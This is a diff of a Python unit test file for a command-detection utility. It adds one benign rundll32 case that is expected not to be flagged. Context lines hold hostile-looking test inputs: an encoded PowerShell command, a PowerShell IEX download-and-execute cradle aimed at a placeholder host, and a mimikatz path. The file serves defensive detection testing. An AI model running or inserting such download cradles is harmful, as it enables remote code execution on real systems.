@@ -12,6 +12,7 @@ class UtilsTests(unittest.TestCase):
         self.assertTrue(utils.suspicious_command("powershell -EncodedCommand SQBFAFgA"))
         self.assertTrue(utils.suspicious_command("IEX (New-Object Net.WebClient).DownloadString('http://example')"))
         self.assertFalse(utils.suspicious_command("C:\\Windows\\System32\\notepad.exe"))
+        self.assertFalse(utils.suspicious_command("rundll32.exe C:\\Windows\\System32\\PcaSvc.dll,PcaPatchSdbTask"))
 
     def test_known_tools(self):
         self.assertEqual(utils.known_tool_name("C:\\Temp\\mimikatz.exe"), "mimikatz")
